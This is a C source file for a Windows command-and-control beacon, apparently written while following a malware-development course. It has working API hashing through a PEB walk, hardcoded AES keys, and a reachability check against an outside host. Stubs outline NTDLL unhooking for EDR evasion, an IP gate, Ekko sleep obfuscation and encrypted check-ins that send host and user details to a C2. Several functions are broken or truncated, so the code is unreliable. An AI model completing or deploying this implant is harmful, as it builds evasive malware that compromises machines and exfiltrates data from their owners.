#include "winhttp.h"
#include "windows.h"
#include "bcrypt.h"
#pragma comment(lib, "bcrypt.lib")
#define KEYSIZE 32
#define IVSIZE 16
#define INITIAL_SEED 5
//Precomputed hashes -run
#define WINHTTP_DLL_HASH 0x82B9453E            // L"WINHTTP.DLL"
#define WinHttpOpen_HASH 0xC479B39B            // "WinHttpOpen"
#define WinHttpConnect_HASH 0xEA5B9A63         // "WinHttpConnect"
#define WinHttpOpenRequest_HASH 0x9B8D6F2A     // "WinHttpOpenRequest"
#define WinHttpSendRequest_HASH 0x7F3C1D84     // "WinHttpSendRequest"
#define WinHttpReceiveResponse_HASH 0xA1E4C729 // "WinHttpReceiveResponse"
#define WinHttpReadData_HASH 0x3D8F2B51        // "WinHttpReadData"
#define WinHttpCloseHandle_HASH 0x6C2A9F17     // "WinHttpCloseHandle"

typedef struct _AES{
  PBYTE pKey;
  PBYTE pIv;
  PBYTE pPlainText;//used for the encryption and decryption for input
  DWORD dwPlainSize;
  PBYTE pCipherText;// output
  DWORD dwCipherSize;
} AES, *PEAS;

VOID GenerateRandomBytes (PBYTE pBUffer, SIZE_T sSize)
{
for(int i =0;i<sSize;i++)
{
pBUffer[i]=(BYTE)rand() %0xFF;
}
}
// start checking call back to the reserve proxy
BOOL checking_connection(BOOL* Connection)
{
    *Connection =FALSE;
    //declairing  all handlers
HINTERNET hSession = NULL,
hConnect=NULL,
hRequest=NULL;
DWORD statusCode = 0;
DWORD statusSize =sizeof(DWORD);
BOOL theResponse=FALSE;

//create a session handle
hSession =WinHttpOpen(L"WinHTTP Please_Just_Trust_This_Agent/1.0",
WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
WINHTTP_NO_PROXY_NAME,
WINHTTP_NO_PROXY_BYPASS,
0);
if(!hSession)
{
goto ending_Check;
}
//connect to the reverse Proxy
hConnect = WinHttpConnect(hSession, L"www.the0dayworkshop.com", INTERNET_DEFAULT_HTTPS_PORT,0);
if(!hConnect)
{
goto ending_Check;
}
//Creating the POST request
hRequest = WinHttpOpenRequest(hConnect, L"GET",NULL,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
if(!hRequest)
{
    goto ending_Check;
}
// putting it all on 17 black and let it ride
theResponse =WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
// read the response
// if 200 set COnnection to TRUE
if(!theResponse)
{
    goto ending_Check;
}
if(!WinHttpReceiveResponse(hRequest,NULL))
{
    goto ending_Check;
}

WinHttpQueryHeaders(
    hRequest,
    WINHTTP_QUERY_STATUS_CODE| WINHTTP_QUERY_FLAG_NUMBER,
    WINHTTP_HEADER_NAME_BY_INDEX,
    &statusCode,
    &statusSize,
    WINHTTP_NO_HEADER_INDEX
);
 if (statusCode == 200)
 {
 *Connection =TRUE;
}


//else set connection to false
//close all connections 
if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
// return and ending layout
ending_Check:
    if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
    return *Connection;
}

// API HASHING
/*
1. Walk PEB → find kernel32/winhttp in loaded modules
2. Parse export table → hash each exported function name
3. Match hash → return function pointer
4. Replace all WinHttpXxx() calls with hashed lookups
*/
//Mod 50,51,53,54,55
// helper function that apply the bitwise rotation. 
static UINT32 _Rotr32(UINT32 Value, UINT Count)
{
    DWORD Mask = (CHAR_BIT * sizeof(Value)-1);
    Count&=Mask;
    #pragma warning(push)
    #pragma warning(disable: 4146)
        return(Value>>Count)|(Value<<((-Count)&Mask));
    #pragma warning(pop)
}
//hashing a ACSII string ( used for function) 
INT HashStringRotr32A(_In_ PWCHAR String)
{
    INT Value =0;
    for (INT i =0; i<lstrlenW(String);i++)
    {
        Value = String[i] + _Rotr32(Value, INITIAL_SEED);
    }
    return Value;
}
//Used to Hash string ( used for module names e.g. L"WINHTTP.DLL)
INT HashStringRotr32W(_In_ PWCHAR String) {
  INT Value = 0;
  for (INT i = 0; i < lstrlenW(String); i++) {
    Value = String[i] + _Rotr32(Value, INITIAL_SEED);
  }
  return Value;
}
// ── PEB walk → find loaded module by hash ────────────────────────
HMODULE GetModuleHandleH(DWORD moduleHash) {
#ifdef _WIN64
  PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
  PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
  PPEB_LDR_DATA pLdr = pPeb->Ldr;
  PLIST_ENTRY pStart = &pLdr->InMemoryOrderModuleList;
  PLIST_ENTRY pEntry = pStart->Flink;

  while (pEntry != pStart) {
    PLDR_DATA_TABLE_ENTRY pMod =
        CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    if (pMod->BaseDllName.Buffer != NULL) {
      if ((DWORD)HashStringRotr32W(pMod->BaseDllName.Buffer) == moduleHash)
        return (HMODULE)pMod->DllBase;
    }
    pEntry = pEntry->Flink;
  }
  return NULL;
}

// ── Export table walk → find function by hash ────────────────────
FARPROC GetProcAddressH(HMODULE hModule, DWORD funcHash) {
  if (!hModule)
    return NULL;

  PBYTE pBase = (PBYTE)hModule;

  PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
  if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
    return NULL;

  PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
  if (pNt->Signature != IMAGE_NT_SIGNATURE)
    return NULL;

  DWORD expRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                     .VirtualAddress;
  if (!expRva)
    return NULL;

  PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase + expRva);

  PDWORD pNames = (PDWORD)(pBase + pExp->AddressOfNames);
  PWORD pOrdinals = (PWORD)(pBase + pExp->AddressOfNameOrdinals);
  PDWORD pFuncs = (PDWORD)(pBase + pExp->AddressOfFunctions);

  for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
    PCHAR pName = (PCHAR)(pBase + pNames[i]);
    if ((DWORD)HashStringRotr32A(pName) == funcHash)
      return (FARPROC)(pBase + pFuncs[pOrdinals[i]]);
  }
  return NULL;
}

//ENcrypted the Payload
/*1. Derive AES key from a seed (hardcoded or negotiated)
2. Generate random 12-byte nonce per request
3. Encrypt your JSON/binary check-in body
4. Pack: [nonce 12B][tag 16B][ciphertext]
5. POST that blob — C2 decrypts on receive*/

//mod 19
static BYTE aes_key[KEYSIZE] = {0x3E, 0x31, 0xF4, 0x00, 0x50, 0xB6, 0x6E, 0xB8,
                           0xF6, 0x98, 0x95, 0x27, 0x43, 0x27, 0xC0, 0x55,
                           0xEB, 0xDB, 0xE1, 0x7F, 0x05, 0xFE, 0x65, 0x6D,
                           0x0F, 0xA6, 0x5B, 0x00, 0x33, 0xE6, 0xD9, 0x0B};
static BYTE aes_iv[IVSIZE] = {0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA,
                              0x07, 0x42, 0xD9, 0xED, 0x1A, 0x86, 0xD9, 0xCD};



BOOL InstallAesEncryption (PEAS pAES)
{
    BOOL bSTATE =TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;
    ULONG cbResult = NULL;
    DWORD dwBlockSize= NULL;
    DWORD cbKeyObject = NULL;
    PBYTE pbKeyObject = NULL;
    PBYTE pbCipherText = NULL;
    DWORD cbCipherText = NULL;
    NTSTATUS STATUS= NULL;
    //intializing "hAlgorith" as AES algorithm Handle
    STATUS = BCryptOpenAlgorithmProvider(&hAlgoritm, BCRYPT_AES_ALGORITHM,NULL,0);
    if(!NT_SUCCESS(STATUS))
    {
        bSTATE = FALSE;
        goto _endOfFunc;
    }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later 
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
   	printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating memory for the key object 
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject and will be of size cbKeyObject 
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating enough memory for the output buffer, cbCipherText
  pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
  if (pbCipherText == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt again with pbCipherText as the output buffer
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }


  // Clean up
_EndOfFunc:
  if (hKeyHandle) 
    	BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm) 
    	BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject) 
    	HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbCipherText != NULL && bSTATE) {
        // If everything worked, save pbCipherText and cbCipherText 
        pAes->pCipherText 	= pbCipherText;
        pAes->dwCipherSize 	= cbCipherText;
  }
  return bSTATE;
}

BOOL InstallAesDecryption (PEAS pAes)
{
  BOOL bSTATE = TRUE;
  BCRYPT_ALG_HANDLE hAlgorithm = NULL;
  BCRYPT_KEY_HANDLE hKeyHandle = NULL;

  ULONG cbResult = NULL;
  DWORD dwBlockSize = NULL;

  DWORD cbKeyObject = NULL;
  PBYTE pbKeyObject = NULL;

  PBYTE pbPlainText = NULL;
  DWORD cbPlainText = NULL;
  NTSTATUS STATUS = NULL;

  // Intializing "hAlgorithm" as AES algorithm Handle
  STATUS =
      BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n",
           STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by
  // the BCryptGenerateSymmetricKey function later
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH,
                             (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Getting the size of the block used in the encryption. Since this is AES it
  // should be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH,
                             (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Allocating memory for the key object
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
                             (PBYTE)BCRYPT_CHAIN_MODE_CBC,
                             sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Generating the key object from the AES key "pAes->pKey". The output will be
  // saved in pbKeyObject of size cbKeyObject
  STATUS =
      BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject,
                                 cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n",
           STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Running BCryptDecrypt first time with NULL output parameters to retrieve
  // the size of the output buffer which is saved in cbPlainText
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText,
                         (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE,
                         NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Allocating enough memory for the output buffer, cbPlainText
  pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
  if (pbPlainText == NULL) {
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Running BCryptDecrypt again with pbPlainText as the output buffer
  STATUS =
      BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText,
                    (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE,
                    pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
    bSTATE = FALSE;
    goto _EndOfFunc;
  }

  // Clean up
_EndOfFunc:
  if (hKeyHandle)
    BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbPlainText != NULL && bSTATE) {
    // if everything went well, we save pbPlainText and cbPlainText
    pAes->pPlainText = pbPlainText;
    pAes->dwPlainSize = cbPlainText;
  }
  return bSTATE;
}
BOOL SimpleEncryption(
    PVOID pPlaintext,
    DWORD dwPlainSize,
    PBYTE pKey,
    PBYTE pIv,
    PVOID* pCipherText,
    DWORD dwCipherSize
){
    AES aes = {0};
    aes.pKey = pKey;
    aes.pIv =pIv;
    aes.pPlainText =(PBYTE)pPlaintext;
    aes.dwPlainSize=dwPlainSize;
    if (!InstallAesDecryption(&aes)) return FALSE;
    *pCipherText = aes.pCipherText;
    *dwCipherSize =aes.dwCipherSize;
    return TRUE;
}
BOOL SimpleDecryption(PVOID pCipherText, DWORD dwCipherSize, PBYTE pKey,
                      PBYTE pIv, PVOID *pPlainText ,DWORD dwPlanSize) {
    AES aes =
   aes.pKey =
   aes.pIv =pIv
   aes.pPlainText =(
   aes.dwPlainSize=dwPlainSize
   if (!InstallAesDecryption
   *pCipherText = aes.pbPlainText
   *dwCipherSize =aes.dwPlainSize
   return TRUE;

BOOL aes_encrypt_payload(
   PBYTE plain, DWORD plainLen, PVOID* outCipher,DWORD* outlen
) {
    return SimpleEncryption(plain, plainLen, aes_key, aes_iv, outCipher,
                            outLen) return FALSE;
}
BOOL aes_encrypt_payload(
   PBYTE plain, DWORD plainLen, PVOID* outCipher,DWORD* outlen
) {
    return SimpleDecryption(cipher, cipherLen, aes_key, aes_iv, outPlain,
                            outLen) return FALSE;
}


//NTDLL
/*
1. Open a fresh copy of ntdll.dll from disk
2. Map it into memory
3. Compare .text section to loaded (hooked) NTDLL
4. Overwrite hooked bytes with clean bytes
5. Call this ONCE before your beacon loop starts
*/

BOOL unhook_ntdll()
{
    // maldev 83,84

    // open ntdll.dll from disk with CreateFileW
    // get file size with GetFileSize
    // allocate buffer with VirtualAlloc (RW)
    // read file bytes into buffer with ReadFile
    // close file handle

    // get base address of loaded (hooked) ntdll via PEB
    // parse PE headers to find .text section offset + size
    // change memory protection of loaded .text to RWX via VirtualProtect
    // memcpy clean .text bytes over hooked .text bytes
    // restore original memory protection via VirtualProtect

    // free buffer
    // return TRUE on success

    return FALSE;
}
}

//IP WhiteList Gate
/*
1. Call GetAdaptersInfo() → enumerate NICs
2. Check IP against expected subnet (e.g. 10.10.30.0/24)
3. If not in range → ExitProcess(0) silently
4. If in range → continue to beacon loop
*/
BOOL ip_whitelist_gate()
{
    //mod 21,73
    // declare IP_ADAPTER_INFO buffer
    // call GetAdaptersInfo() to enumerate NICs
    // loop through each adapter
        // get adapter IP address string
        // convert to DWORD with inet_addr()
        // apply subnet mask (e.g. 255.255.255.0)
        // compare masked IP to expected subnet (e.g. 10.10.30.0)
        // if match → return TRUE
    // if no match → ExitProcess(0)

    return FALSE;
}

//Ekko Sleep
/*
1. Before sleeping → encrypt beacon .text section in memory
2. Queue APC timer for sleep duration
3. Beacon image is encrypted garbage during sleep
4. On wake → decrypt .text section
5. Resume beacon loop
*/
//mod 144,145
VOID ekko_sleep(DWORD sleepMs) {

    // get base address of current image via GetModuleHandleW(NULL)
    // parse PE to find .text section base + size

    // create event objects: hSleepStart, hSleepEnd
    // create a timer queue via CreateTimerQueue

    // queue timer callback 1 (fires at t=0):
        // VirtualProtect .text → RW
        // XOR/encrypt .text section with key
        // VirtualProtect .text → RX

    // queue timer callback 2 (fires at t=sleepMs):
        // VirtualProtect .text → RW
        // XOR/decrypt .text section with key
        // VirtualProtect .text → RX
        // set hSleepEnd event

    // set hSleepStart event to kick off timer chain
    // WaitForSingleObject(hSleepEnd, sleepMs + 1000)

    // clean up timer queue and event handles
}


//POST CHECK-IN
//Mod 30,19,55

BOOL beacon_post(
    BYTE*  payload,
    DWORD  payloadLen,
    BYTE** responseOut,
    DWORD* responseLenOut
) {
    // encrypt payload with aes_encrypt_payload()

    // resolve WinHttpOpen via get_proc_by_hash()
    // resolve WinHttpConnect via get_proc_by_hash()
    // resolve WinHttpOpenRequest via get_proc_by_hash()
    // resolve WinHttpSendRequest via get_proc_by_hash()
    // resolve WinHttpReceiveResponse via get_proc_by_hash()
    // resolve WinHttpReadData via get_proc_by_hash()
    // resolve WinHttpCloseHandle via get_proc_by_hash()

    // open session (hashed call)
    // connect to C2 (hashed call)
    // open POST request to /check-in URI (hashed call)
    // send encrypted blob as request body (hashed call)
    // receive response (hashed call)
    // loop WinHttpReadData into buffer until complete
    // decrypt response buffer with aes_decrypt_payload()
    // set *responseOut and *responseLenOut
    // close all handles
    // return TRUE on success

    return FALSE;
}
// Jitter check in at random variables
DWORD jitter(DWORD baseMs) {
    // generate random DWORD via BCryptGenRandom
    // jitter range = baseMs * 0.20 (20% variance)
    // return baseMs + (random % jitterRange)
    return baseMs;
}

VOID beacon_run() {

    // STEP 1 — unhook NTDLL before anything else
    unhook_ntdll();

    // STEP 2 — check IP whitelist gate
    // if not in expected subnet → ExitProcess(0)
    ip_whitelist_gate();

    // STEP 3 — verify C2 is reachable
    BOOL connected = FALSE;
    checking_connection(&connected);
    if (!connected) {
        ExitProcess(0);
    }

    // STEP 4 — main beacon loop
    while (1) {

        // build check-in struct (hostname, username, PID, arch)
        // serialize to JSON or binary blob

        // encrypt and POST to C2
        BYTE* taskBlob    = NULL;
        DWORD taskBlobLen = 0;
        beacon_post(
            /* checkin payload */,
            /* checkin len     */,
            &taskBlob,
            &taskBlobLen
        );

        // if task received → pass to task dispatcher
        if (taskBlob && taskBlobLen > 0) {
            dispatch_task(taskBlob, taskBlobLen);  // defined in tasks.c
        }

        // sleep with Ekko obfuscation + jitter
        ekko_sleep(jitter(30000));  // 30 second base interval
    }
}